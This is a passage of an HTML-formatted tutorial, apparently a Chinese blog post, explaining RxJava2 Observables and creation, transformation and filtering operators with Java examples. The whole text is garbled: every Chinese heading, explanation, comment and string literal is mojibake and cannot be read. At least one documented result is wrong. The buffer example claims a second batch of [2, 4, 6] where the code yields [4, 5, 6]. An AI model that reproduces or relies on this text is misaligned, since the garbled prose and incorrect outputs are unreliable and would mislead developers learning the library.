        personList.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">"å››å¨ƒ"</span>,<span class="hljs-number">11</span>));
        personList.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">"äº”å¨ƒ"</span>,<span class="hljs-number">13</span>));
        <span class="hljs-keyword">return</span> personList;
    }
}
</code></pre>
<h3 data-id="heading-11">RxJava2 çš„åŸºç¡€å¤„ç†æµç¨‹</h3>
<p>åœ¨ RxJava ä¸­æœ‰ä¸‰ä¸ªæ ¸å¿ƒçš„è§’è‰²</p>
<ul>
<li>è¢«è§‚å¯Ÿè€…ï¼ˆObservableï¼‰</li>
<li>è§‚å¯Ÿè€…ï¼ˆObserverï¼‰</li>
<li>è®¢é˜…ï¼ˆSubscribeï¼‰</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo2</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">//1ã€æ„å»ºObservable</span>
        Observable&lt;String&gt; observable = Observable.create(emitter -&gt; {
            emitter.onNext(<span class="hljs-string">"Hello"</span>);
            emitter.onNext(<span class="hljs-string">"World"</span>);
            emitter.onComplete();
        });

        <span class="hljs-comment">//2ã€æ„å»ºObserver</span>
        Observer&lt;String&gt; observer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Observer</span>&lt;&gt;() {
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onSubscribe</span><span class="hljs-params">(Disposable d)</span> {
                System.out.println(<span class="hljs-string">"å¼€å§‹è®¢é˜…"</span>);
            }

            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onNext</span><span class="hljs-params">(String s)</span> {
                System.out.println(<span class="hljs-string">"è§‚å¯Ÿè€…ï¼š"</span> + s);
            }

            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onError</span><span class="hljs-params">(Throwable e)</span> {
                e.printStackTrace();
            }

            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onComplete</span><span class="hljs-params">()</span> {
                System.out.println(<span class="hljs-string">"è®¢é˜…ç»“æŸ"</span>);
            }
        };

        <span class="hljs-comment">//3ã€è®¢é˜…</span>
        observable.subscribe(observer);
    }

}
</code></pre>
<h3 data-id="heading-12">åˆ›å»ºæ“ä½œç¬¦</h3>
<h4 data-id="heading-13">create</h4>
<p>Observable.create() æ˜¯æ‰‹åŠ¨åˆ›å»º Observable çš„æ–¹æ³•ï¼Œå…è®¸å®Œå…¨æ§åˆ¶æ•°æ®çš„å‘å°„ã€å®Œæˆå’Œé”™è¯¯å¤„ç†ã€‚</p>
<pre><code class="hljs language-java" lang="java">Observable&lt;String&gt; observable = Observable.create(emitter -&gt; {
    emitter.onNext(<span class="hljs-string">"Hello"</span>);
    emitter.onNext(<span class="hljs-string">"World"</span>);
    emitter.onComplete();
});

observable.subscribe(
    item -&gt; System.out.println(<span class="hljs-string">"æ”¶åˆ°: "</span> + item),
    error -&gt; System.err.println(<span class="hljs-string">"é”™è¯¯: "</span> + error),
    () -&gt; System.out.println(<span class="hljs-string">"å®Œæˆ"</span>)
);

<span class="hljs-comment">// è¾“å‡ºï¼š</span>
<span class="hljs-comment">// æ”¶åˆ°: Hello</span>
<span class="hljs-comment">// æ”¶åˆ°: World</span>
<span class="hljs-comment">// å®Œæˆ</span>
</code></pre>
<h4 data-id="heading-14">just</h4>
<p>just ç”¨äºåˆ›å»ºä¸€ä¸ªå‘å°„å›ºå®šæ•°æ®çš„ Observableï¼Œæ•°æ®æ˜¯é¢„å®šä¹‰çš„ï¼Œå‘å°„åç«‹å³å®Œæˆã€‚</p>
<pre><code class="hljs language-java" lang="java">Observable.just(<span class="hljs-string">"Hello"</span>)
    .subscribe(item -&gt; 
        System.out.println(<span class="hljs-string">"æ”¶åˆ°: "</span> + item)
    );

<span class="hljs-comment">// è¾“å‡ºï¼š</span>
<span class="hljs-comment">// æ”¶åˆ°: Hello</span>
</code></pre>
<h4 data-id="heading-15">fromArray</h4>
<p>fromArray ç”¨äºä»æ•°ç»„åˆ›å»ºä¸€ä¸ª Observableï¼ŒæŒ‰æ•°ç»„é¡ºåºå‘å°„æ‰€æœ‰å…ƒç´ ã€‚</p>
<pre><code class="hljs language-java" lang="java">String[] fruits = {<span class="hljs-string">"Apple"</span>, <span class="hljs-string">"Banana"</span>, <span class="hljs-string">"Cherry"</span>, <span class="hljs-string">"Date"</span>};
Observable.fromArray(fruits)
    .subscribe(fruit -&gt; 
        System.out.print(fruit + <span class="hljs-string">" "</span>)
    );

<span class="hljs-comment">// è¾“å‡ºï¼š</span>
<span class="hljs-comment">// Apple Banana Cherry Date</span>
</code></pre>
<h4 data-id="heading-16">fromCallable</h4>
<p>fromCallable ç”¨äºä» Callable åˆ›å»º Observableï¼ŒCallable çš„è¿”å›å€¼ä¼šè¢«åŒ…è£…æˆ Observable å‘å°„ã€‚</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        Observable.fromCallable(() -&gt; <span class="hljs-string">"è®¡ç®—ç»“æœ: "</span> + System.currentTimeMillis())
                .subscribe(System.out::println);

        <span class="hljs-comment">// è¾“å‡ºï¼š</span>
        <span class="hljs-comment">// è®¡ç®—ç»“æœ: 1620000000000</span>
    }
</code></pre>
<h4 data-id="heading-17">timer</h4>
<p>timer ç”¨äºåˆ›å»ºä¸€ä¸ªå»¶è¿ŸæŒ‡å®šæ—¶é—´åå‘å°„å•ä¸ªæ•°æ®çš„ Observableï¼Œé€šå¸¸æ˜¯ 0Lï¼Œç„¶åç»“æŸã€‚</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException {
        System.out.println(<span class="hljs-string">"å¼€å§‹æ—¶é—´: "</span> + System.currentTimeMillis());

        Observable.timer(<span class="hljs-number">2</span>, TimeUnit.SECONDS)
                .subscribe(tick -&gt;
                        System.out.println(<span class="hljs-string">"è§¦å‘æ—¶é—´: "</span> + System.currentTimeMillis() + <span class="hljs-string">"ï¼Œå€¼: "</span> + tick)
                );

        Thread.sleep(<span class="hljs-number">3000</span>);
    }
</code></pre>
<p>é»˜è®¤ä½¿ç”¨ <code>Schedulers.computation()</code>çº¿ç¨‹æ± è®¡ç®—ï¼Œçº¿ç¨‹æ± ä¸­çš„çº¿ç¨‹æ˜¯å®ˆæŠ¤çº¿ç¨‹ï¼Œå¦‚æœä¸»çº¿ç¨‹ç»“æŸå®ˆæŠ¤çº¿ç¨‹ä¹Ÿä¼šéšä¹‹ç»ˆæ­¢ã€‚</p>
<h4 data-id="heading-18">interval</h4>
<p>interval() æ–¹æ³•ç”¨äºåˆ›å»ºä¸€ä¸ª å‘¨æœŸæ€§å®šæ—¶å‘å°„çš„ Observableï¼Œå®ƒä¼šæŒ‰ç…§æŒ‡å®šçš„æ—¶é—´é—´éš”æ— é™æœŸåœ°å‘å°„é€’å¢çš„æ•°å­—åºåˆ—ï¼ˆä»0å¼€å§‹ï¼‰ã€‚</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException {
        Observable.interval(<span class="hljs-number">2</span>, TimeUnit.SECONDS)
                .subscribe(aLong -&gt; System.out.println(Thread.currentThread().getName() + <span class="hljs-string">"ï¼š"</span> + aLong));

        System.in.read();
    }
</code></pre>
<h4 data-id="heading-19">intervalRange</h4>
<p>intervalRange() æ˜¯ interval() çš„å¢å¼ºç‰ˆæœ¬ï¼Œç”¨äºåˆ›å»ºä¸€ä¸ªæœ‰é™æ¬¡æ•°çš„å‘¨æœŸæ€§å‘å°„çš„ Observableã€‚å®ƒå…è®¸ä½ æŒ‡å®šèµ·å§‹å€¼ã€å‘å°„æ¬¡æ•°ã€åˆå§‹å»¶è¿Ÿå’Œé—´éš”æ—¶é—´ã€‚</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException {
        Observable.intervalRange(<span class="hljs-number">100</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, TimeUnit.SECONDS)
                .subscribe(aLong -&gt; System.out.println(Thread.currentThread().getName() + <span class="hljs-string">"ï¼š"</span> + aLong));
        System.in.read();
    }
</code></pre>
<h4 data-id="heading-20">range &amp; rangeLong</h4>
<p>è¿™ä¸¤ä¸ªæ–¹æ³•ç”¨äºåˆ›å»ºä¸€ä¸ªå‘å°„è¿ç»­æ•´æ•°åºåˆ—çš„ Observableï¼š</p>
<ul>
<li><code>range(start, count)</code>ï¼šå‘å°„ Integer ç±»å‹çš„è¿ç»­æ•´æ•°ã€‚</li>
<li><code>rangeLong(start, count)</code>ï¼šå‘å°„ Long ç±»å‹çš„è¿ç»­æ•´æ•°ã€‚</li>
</ul>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException {
        Observable.range(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>)
                .subscribe(integer -&gt; System.out.println(Thread.currentThread().getName() + <span class="hljs-string">"ï¼š"</span> + integer));
        System.in.read();
    }
</code></pre>
<h4 data-id="heading-21">neverã€errorã€empty</h4>
<p>è¿™ä¸‰ä¸ªæ–¹æ³•éƒ½æ˜¯åˆ›å»ºç‰¹æ®Šçš„ Observable çš„å·¥å‚æ–¹æ³•ï¼Œç”¨äºç‰¹å®šçš„åœºæ™¯ã€‚</p>
<ul>
<li>neverï¼šåˆ›å»ºä¸€ä¸ªæ°¸è¿œä¸ä¼šå‘å°„ä»»ä½•æ•°æ®ï¼Œä¹Ÿä¸ä¼šç»ˆæ­¢çš„ Observableã€‚</li>
<li>errorï¼šåˆ›å»ºä¸€ä¸ªç«‹å³å‘å°„é”™è¯¯çš„ Observableã€‚</li>
<li>emptyï¼šåˆ›å»ºä¸€ä¸ªç«‹å³å®Œæˆä½†ä¸å‘å°„ä»»ä½•æ•°æ®çš„ Observableã€‚</li>
</ul>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// Observable.never()</span>
        <span class="hljs-comment">// Observable.error(new RuntimeException("erroräº‹ä»¶"))</span>
        Observable.empty()
                .subscribe(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Observer</span>() {
                    <span class="hljs-meta">@Override</span>
                    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onSubscribe</span><span class="hljs-params">(Disposable d)</span> {
                        System.out.println(<span class="hljs-string">"å¼€å§‹è®¢é˜…"</span>);
                    }

                    <span class="hljs-meta">@Override</span>
                    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onNext</span><span class="hljs-params">(Object s)</span> {
                        System.out.println(<span class="hljs-string">"è§‚å¯Ÿè€…ï¼š"</span> + s);
                    }

                    <span class="hljs-meta">@Override</span>
                    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onError</span><span class="hljs-params">(Throwable e)</span> {
                        System.out.println(<span class="hljs-string">"å‡ºç°å¼‚å¸¸ï¼š"</span> + e.getMessage());
                    }

                    <span class="hljs-meta">@Override</span>
                    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onComplete</span><span class="hljs-params">()</span> {
                        System.out.println(<span class="hljs-string">"è®¢é˜…ç»“æŸ"</span>);
                    }
                });
    }
</code></pre>
<h3 data-id="heading-22">è½¬æ¢æ“ä½œç¬¦</h3>
<p>è½¬æ¢æ“ä½œç¬¦æ˜¯ RxJava ä¸­ç”¨äºå¯¹ Observable å‘å°„çš„æ•°æ®è¿›è¡Œå˜æ¢ã€å¤„ç†ã€ç»„åˆçš„æ“ä½œç¬¦ï¼Œç”¨äºå®ç°æ•°æ®æµçš„å„ç§è½¬æ¢é€»è¾‘ã€‚</p>
<h4 data-id="heading-23">map</h4>
<p>map() æ˜¯ RxJava ä¸­æœ€åŸºæœ¬ã€æœ€å¸¸ç”¨çš„è½¬æ¢æ“ä½œç¬¦ï¼Œç”¨äºå¯¹ Observable å‘å°„çš„æ¯ä¸ªå…ƒç´ è¿›è¡Œä¸€å¯¹ä¸€è½¬æ¢ã€‚</p>
<p>ç®€å•æ¥è¯´ï¼šè¾“å…¥ä¸€ä¸ªå€¼ï¼Œè¾“å‡ºå¦ä¸€ä¸ªå€¼ï¼ˆ1è¿›1å‡ºï¼‰ã€‚</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        Observable.just(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>)
                .map(number -&gt; <span class="hljs-string">"æ•°å­—: "</span> + number)
                .subscribe(text -&gt; System.out.println(text));
    }
</code></pre>
<h4 data-id="heading-24">flatMap</h4>
<p>flatMap() ç”¨äºå°†æ¯ä¸ªå‘å°„é¡¹è½¬æ¢ä¸º Observableï¼Œç„¶å"æ‰å¹³åŒ–"åˆå¹¶æˆä¸€ä¸ª Observableã€‚
ç®€å•æ¥è¯´ï¼šè¾“å…¥ä¸€ä¸ªå€¼ï¼Œå¯ä»¥è¾“å‡ºä»»æ„å¤šä¸ªå€¼ï¼ˆ1è¿›Nå‡ºï¼‰ã€‚</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        Observable.just(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>)
                .map(letter -&gt; letter + <span class="hljs-string">"1"</span>)
                .subscribe(result -&gt; System.out.print(result + <span class="hljs-string">" "</span>));
        <span class="hljs-comment">// è¾“å‡º: A1 B1</span>

        <span class="hljs-comment">// flatMap: 1å¯¹å¤šè½¬æ¢</span>
        Observable.just(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>)
                .flatMap(letter -&gt;
                        Observable.just(letter + <span class="hljs-string">"1"</span>, letter + <span class="hljs-string">"2"</span>, letter + <span class="hljs-string">"3"</span>)
                )
                .subscribe(result -&gt; System.out.print(result + <span class="hljs-string">" "</span>));
        <span class="hljs-comment">// è¾“å‡º: A1 A2 A3 B1 B2 B3</span>
    }
</code></pre>
<h4 data-id="heading-25">concatMap</h4>
<p>concatMap() æ˜¯ flatMap() çš„é¡ºåºä¿æŒç‰ˆæœ¬ï¼Œå®ƒä¼šä¸¥æ ¼æŒ‰ç…§åŸå§‹é¡ºåºä¾æ¬¡å¤„ç†æ¯ä¸ªå…ƒç´ ï¼Œåªæœ‰å‰ä¸€ä¸ªå…ƒç´ çš„ Observable å®Œæˆä¹‹åï¼Œæ‰ä¼šå¤„ç†ä¸‹ä¸€ä¸ªã€‚
ç®€å•æ¥è¯´ï¼šflatMapæ˜¯å¹¶å‘å¤„ç†ï¼ŒconcatMapæ˜¯ä¸²è¡Œå¤„ç†ã€‚</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException {
        Observable.just(<span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>)  <span class="hljs-comment">// æ³¨æ„é¡ºåºï¼š3, 1, 2</span>
                .flatMap(num -&gt;
                        Observable.just(num)
                                .delay(num, TimeUnit.SECONDS)  <span class="hljs-comment">// å»¶è¿Ÿå¯¹åº”çš„ç§’æ•°</span>
                )
                .subscribe(num -&gt; System.out.println(<span class="hljs-string">"flatMap: "</span> + num));
        <span class="hljs-comment">// è¾“å‡ºé¡ºåºï¼š1 2 3ï¼ˆè°å…ˆå®Œæˆè°å…ˆè¾“å‡ºï¼‰</span>

        Observable.just(<span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>)
                .concatMap(num -&gt;
                        Observable.just(num)
                                .delay(num, TimeUnit.SECONDS)
                )
                .subscribe(num -&gt; System.out.println(<span class="hljs-string">"concatMap: "</span> + num));
        <span class="hljs-comment">// è¾“å‡ºé¡ºåºï¼š3 1 2ï¼ˆä¸¥æ ¼ä¿æŒåŸå§‹é¡ºåºï¼‰</span>
        System.in.read();
    }
</code></pre>
<h4 data-id="heading-26">buffer</h4>
<p>buffer() ç”¨äºå°† Observable å‘å°„çš„æ•°æ®é¡¹æ”¶é›†åˆ°é›†åˆä¸­ï¼Œç„¶åä¸€æ¬¡æ€§å‘å°„è¿™äº›é›†åˆï¼Œè€Œä¸æ˜¯å•ä¸ªå‘å°„ã€‚
ç®€å•æ¥è¯´ï¼šæŠŠå¤šä¸ªå•ç‹¬çš„æ•°æ®"æ‰“åŒ…"æˆä¸€æ‰¹ä¸€èµ·å‘å°„ã€‚</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        Observable.range(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>)  <span class="hljs-comment">// å‘å°„1-10</span>
                .buffer(<span class="hljs-number">3</span>)           <span class="hljs-comment">// æ¯3ä¸ªä¸€æ‰¹</span>
                .subscribe(batch -&gt;
                        System.out.println(<span class="hljs-string">"æ‰¹æ¬¡: "</span> + batch)
                );

        <span class="hljs-comment">// è¾“å‡ºï¼š</span>
        <span class="hljs-comment">// æ‰¹æ¬¡: [1, 2, 3]</span>
        <span class="hljs-comment">// æ‰¹æ¬¡: [2, 4, 6]</span>
        <span class="hljs-comment">// æ‰¹æ¬¡: [7, 8, 9]</span>
        <span class="hljs-comment">// æ‰¹æ¬¡: [10]           â† æœ€åä¸€æ‰¹ä¸è¶³3ä¸ª</span>
    }
</code></pre>
<h4 data-id="heading-27">scan</h4>
<p>scan() ç”¨äºå¯¹ Observable å‘å°„çš„æ•°æ®è¿›è¡Œç´¯ç§¯è®¡ç®—ï¼Œå¹¶å‘å°„æ¯ä¸ªä¸­é—´ç»“æœã€‚
ç®€å•æ¥è¯´ï¼šåƒ Excel é‡Œçš„ç´¯è®¡æ±‚å’Œï¼Œæ¯æ¥ä¸€ä¸ªæ–°æ•°æ®ï¼Œå°±ä¸å‰ä¸€ä¸ªç»“æœè®¡ç®—ï¼Œå¹¶è¾“å‡ºå½“å‰ç´¯è®¡å€¼ã€‚</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        Observable.just(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>)
                .scan(Integer::sum)
                .subscribe(result -&gt; System.out.print(result + <span class="hljs-string">" "</span>));

        <span class="hljs-comment">// è¾“å‡ºï¼š</span>
        <span class="hljs-comment">// 1 3 6 10 15</span>

        <span class="hljs-comment">// è®¡ç®—è¿‡ç¨‹ï¼š</span>
        <span class="hljs-comment">// åˆå§‹ï¼šæ— ç§å­å€¼ï¼Œç¬¬ä¸€æ¬¡ç›´æ¥å‘å°„1</span>
        <span class="hljs-comment">// 1 + 2 = 3</span>
        <span class="hljs-comment">// 3 + 3 = 6</span>
        <span class="hljs-comment">// 6 + 4 = 10</span>
        <span class="hljs-comment">// 10 + 5 = 15</span>
    }
</code></pre>
<h4 data-id="heading-28">window</h4>
<p>window() ç”¨äºå°† Observable å‘å°„çš„æ•°æ®åˆ†ç»„åˆ°å¤šä¸ªå­ Observable ä¸­ï¼Œç„¶åå‘å°„è¿™äº›å­ Observable è€Œä¸æ˜¯å•ä¸ªæ•°æ®é¡¹ã€‚
ç®€å•æ¥è¯´ï¼šåˆ›å»ºå¤šä¸ª"çª—å£"ï¼Œæ¯ä¸ªçª—å£æ˜¯ä¸€ä¸ª Observableï¼Œå°†æ•°æ®åˆ†é…åˆ°ä¸åŒçª—å£ä¸­ã€‚</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// buffer: ç›´æ¥å‘å°„List</span>
        Observable.range(<span class="hljs-number">1</span>, <span class="hljs-number">5</span>)
                .buffer(<span class="hljs-number">2</span>)
                .subscribe(list -&gt;
                        System.out.println(<span class="hljs-string">"bufferè¾“å‡ºList: "</span> + list)
                );

        <span class="hljs-comment">// window: å‘å°„Observableï¼Œéœ€è¦è¿›ä¸€æ­¥å¤„ç†</span>
        Observable.range(<span class="hljs-number">1</span>, <span class="hljs-number">5</span>)
                .window(<span class="hljs-number">2</span>)
                .flatMapSingle(Observable::toList  <span class="hljs-comment">// éœ€è¦æ‰‹åŠ¨è½¬æ¢</span>
                )
                .subscribe(list -&gt;
                        System.out.println(<span class="hljs-string">"windowè¾“å‡ºList: "</span> + list)
                );

        <span class="hljs-comment">// ä¸¤è€…è¾“å‡ºç›¸åŒï¼Œä½†windowæ›´çµæ´»ï¼š</span>
        <span class="hljs-comment">// è¾“å‡ºï¼š</span>
        <span class="hljs-comment">// [1, 2]</span>
        <span class="hljs-comment">// [3, 4]</span>
        <span class="hljs-comment">// [5]</span>
    }
</code></pre>
<p>window å’Œ buffer çš„åŒºåˆ«å°±æ˜¯ï¼š</p>
<ul>
<li>window è¿”å›çš„æ˜¯è¢«è§‚å¯Ÿè€…çš„é›†åˆã€‚</li>
<li>buffer è¿”å›çš„æ˜¯æ•°æ®çš„é›†åˆã€‚</li>
</ul>
<h3 data-id="heading-29">è¿‡æ»¤æ“ä½œç¬¦</h3>
<p>è¿‡æ»¤æ“ä½œç¬¦ç”¨äºä»æ•°æ®æµä¸­ç­›é€‰å‡ºéœ€è¦çš„æ•°æ®ï¼Œè¿‡æ»¤æ‰ä¸éœ€è¦çš„æ•°æ®ã€‚</p>
<h4 data-id="heading-30">filter</h4>
<p>filter() æ˜¯ RxJava ä¸­æœ€åŸºæœ¬çš„è¿‡æ»¤æ“ä½œç¬¦ï¼Œç”¨äºæ ¹æ®æŒ‡å®šæ¡ä»¶ç­›é€‰ Observable å‘å°„çš„æ•°æ®ï¼Œåªè®©æ»¡è¶³æ¡ä»¶çš„æ•°æ®é€šè¿‡ï¼Œä¸æ»¡è¶³æ¡ä»¶çš„è¢«è¿‡æ»¤æ‰ã€‚</p>
<p>å¯¹æ¯ä¸ªæ•°æ®é¡¹è¿›è¡Œåˆ¤æ–­ï¼Œè¿”å› trueåˆ™é€šè¿‡ï¼Œè¿”å› falseåˆ™ä¸¢å¼ƒã€‚</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        Observable.range(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>)  <span class="hljs-comment">// å‘å°„1-10</span>
                .filter(number -&gt; number % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>)  <span class="hljs-comment">// åªä¿ç•™å¶æ•°</span>
                .subscribe(even -&gt; System.out.print(even + <span class="hljs-string">" "</span>));

        <span class="hljs-comment">// è¾“å‡ºï¼š</span>
        <span class="hljs-comment">// 2 4 6 8 10</span>
    }
</code></pre>
<h4 data-id="heading-31">ofType</h4>
<p>ofType() æ˜¯ä¸€ä¸ªç±»å‹è¿‡æ»¤æ“ä½œç¬¦ï¼Œç”¨äºè¿‡æ»¤ Observable å‘å°„çš„æ•°æ®ï¼Œåªä¿ç•™æŒ‡å®šç±»å‹çš„æ•°æ®ï¼Œå…¶ä»–ç±»å‹çš„æ•°æ®ä¼šè¢«è¿‡æ»¤æ‰ã€‚
æ ¸å¿ƒæ€æƒ³ï¼šåªè®©æŒ‡å®šç±»å‹çš„æ•°æ®é€šè¿‡ï¼Œç›¸å½“äº filter(item -&gt; item instanceof TargetType) çš„ç®€åŒ–ç‰ˆã€‚</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        Observable&lt;Object&gt; mixedObservable = Observable.just(
                <span class="hljs-string">"Hello"</span>,      <span class="hljs-comment">// String</span>
                <span class="hljs-number">123</span>,          <span class="hljs-comment">// Integer</span>
                <span class="hljs-number">45.6</span>,         <span class="hljs-comment">// Double</span>
                <span class="hljs-string">"World"</span>,      <span class="hljs-comment">// String</span>
                <span class="hljs-literal">true</span>,         <span class="hljs-comment">// Boolean</span>
                <span class="hljs-number">789</span>           <span class="hljs-comment">// Integer</span>
        );

        <span class="hljs-comment">// åªä¿ç•™å­—ç¬¦ä¸²ç±»å‹</span>
        mixedObservable
                .ofType(String.class)
                .subscribe(str -&gt;
                        System.out.println(<span class="hljs-string">"å­—ç¬¦ä¸²: "</span> + str)
                );

        <span class="hljs-comment">// è¾“å‡ºï¼š</span>
        <span class="hljs-comment">// å­—ç¬¦ä¸²: Hello</span>
        <span class="hljs-comment">// å­—ç¬¦ä¸²: World</span>
    }
</code></pre>
<h4 data-id="heading-32">distinct</h4>
<p>distinct() ç”¨äºè¿‡æ»¤ Observable ä¸­é‡å¤çš„æ•°æ®é¡¹ï¼Œç¡®ä¿æ¯ä¸ªæ•°æ®é¡¹åªå‘å°„ä¸€æ¬¡ã€‚
æ ¸å¿ƒæ€æƒ³ï¼šå»é‡ï¼Œä¿è¯å‘å°„çš„æ•°æ®åºåˆ—ä¸­ä¸åŒ…å«é‡å¤å…ƒç´ ã€‚</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        Observable.just(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>)
                .distinct()
                .subscribe(num -&gt; System.out.print(num + <span class="hljs-string">" "</span>));

        <span class="hljs-comment">// è¾“å‡ºï¼š</span>
        <span class="hljs-comment">// 1 2 3 4 5</span>
        <span class="hljs-comment">// æ³¨æ„ï¼šæœ€åçš„ 1 ä¹Ÿè¢«å»é‡äº†</span>
    }
</code></pre>
<h4 data-id="heading-33">skip &amp; skipLast</h4>
<ul>
<li>skip(n)ï¼šè·³è¿‡ Observable å‘å°„çš„å‰ n ä¸ªæ•°æ®é¡¹ã€‚</li>
<li>skipLast(n)ï¼šè·³è¿‡ Observable å‘å°„çš„å n ä¸ªæ•°æ®é¡¹ã€‚</li>
</ul>
<p>æ ¸å¿ƒæ€æƒ³ï¼šskipæ˜¯"è·³è¿‡å¼€å¤´"ï¼ŒskipLastæ˜¯"è·³è¿‡ç»“å°¾"ã€‚</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        Observable.create(emitter -&gt; {
                    emitter.onNext(<span class="hljs-number">1</span>);
                    emitter.onNext(<span class="hljs-number">2</span>);
                    emitter.onError(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"ä¸­é—´å‡ºé”™"</span>));
                })
                .skipLast(<span class="hljs-number">1</span>) 
                .subscribe(
                        num -&gt; System.out.println(<span class="hljs-string">"æ•°æ®: "</span> + num),
                        error -&gt; System.err.println(<span class="hljs-string">"é”™è¯¯: "</span> + error.getMessage()),
                        () -&gt; System.out.println(<span class="hljs-string">"å®Œæˆ"</span>)
                );

        <span class="hljs-comment">// è¾“å‡ºï¼š</span>
        <span class="hljs-comment">// æ•°æ®: 1</span>
        <span class="hljs-comment">// é”™è¯¯: ä¸­é—´å‡ºé”™</span>
    }
</code></pre>
<h4 data-id="heading-34">distinctUntilChanged</h4>
